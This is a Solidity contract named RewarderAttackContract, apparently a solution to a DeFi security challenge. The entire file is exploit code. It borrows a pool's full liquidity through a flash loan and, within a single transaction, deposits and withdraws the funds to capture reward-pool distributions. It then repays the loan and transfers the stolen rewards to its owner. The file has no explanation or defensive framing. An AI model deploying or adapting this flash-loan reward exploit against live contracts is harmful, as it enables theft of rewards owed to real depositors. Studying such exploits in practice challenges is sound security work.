// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IRewarderPool {

    function deposit (uint256 amountToDeposit) external;

    function withdraw (uint256 amountToWithDraw) external;

    function distributeRewards () external;

}

interface IFlashLoanerPool {

    function flashLoan (uint256 amount) external;
}


contract RewarderAttackContract is Ownable {

    IRewarderPool rewardPool;
    IFlashLoanerPool loanPool;
    IERC20 rewardToken;
    IERC20 liquidityToken;
    uint256 loanAmount; 

    function attack(IRewarderPool _rewardPool, IFlashLoanerPool _loanPool, IERC20 _rewardToken, IERC20 _liquidityToken) public onlyOwner {
        rewardPool = _rewardPool;
        loanPool = _loanPool;
        rewardToken = _rewardToken;
        liquidityToken = _liquidityToken;
        loanAmount = liquidityToken.balanceOf(address(loanPool));

        liquidityToken.approve(address(rewardPool), loanAmount);

        require(loanAmount > 0, "flash loan amount needs to be non-zero");
        loanPool.flashLoan(loanAmount);

        require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
        bool sent = rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
        require(sent, "Transfer of reward tokens failed");
    }

    function receiveFlashLoan(uint256 _amount) external {
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        rewardPool.distributeRewards();

        liquidityToken.transfer(address(loanPool), _amount);
    }

    receive() external payable {}

}